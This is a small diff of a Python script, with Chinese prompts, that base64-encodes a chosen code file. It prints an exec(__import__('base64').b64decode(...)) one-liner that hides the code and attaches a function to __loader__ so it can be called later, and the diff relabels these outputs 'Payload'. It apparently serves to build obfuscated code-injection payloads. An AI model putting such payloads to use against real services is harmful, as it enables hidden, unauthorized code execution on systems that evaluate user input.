@@ -14,6 +14,7 @@ if False:
 FUNC_NAME = 'ZzRTSoDE'
 
 import base64
+
 path = input('请输入要写入的代码文件路径(默认test.py): ')
 path = path if path != '' else 'test.py'
 with open(path, 'r') as f:
@@ -25,7 +26,7 @@ for i in a0:
 a2 = chr(10).join(a1)
 
 a3 = base64.b64encode(a2.encode()).decode()
-print('写入静态代码命令: ')
+print('写入静态代码Payload: ')
 print(f'''str(exec(__import__('base64').b64decode('{a3}'))) + str(setattr(__loader__,'{FUNC_NAME}', {FUNC_NAME}))''')
-print('调用静态代码命令: ')
+print('执行静态代码Payload: ')
 print(f'''__loader__.{FUNC_NAME}()''')
